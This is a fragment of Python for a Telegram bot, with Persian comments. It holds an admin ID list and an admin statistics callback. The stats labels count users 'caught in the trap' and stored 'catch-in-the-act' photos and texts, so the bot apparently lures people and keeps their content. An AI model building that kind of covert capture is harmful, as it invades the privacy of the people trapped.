...
# 🔁 آیدی عددی خودت رو اینجا بذار (از @userinfobot بگیر)
ADMIN_IDS = [7301015165, 5333419558]  # ← این را با آیدی خودت جایگزین کن
...
def admin_callback(call):
    ...
    if action == "stats":
        text = (
            "📊 **آمار کامل ربات**\n\n"
            f"👤 کل کاربران ثبت‌نام کرده: {get_total_users()}\n"
            f"📝 گزارش‌های در انتظار: {get_total_reports()}\n"
            f"🎯 کاربرانی که در تله افتاده‌اند: {get_total_trapped()}\n"
            f"🖼 عکس‌های مچ‌گیری ذخیره شده: {get_total_photos()}\n"
            f"📝 متن‌های مچ‌گیری ذخیره شده: {get_total_texts()}"
        )
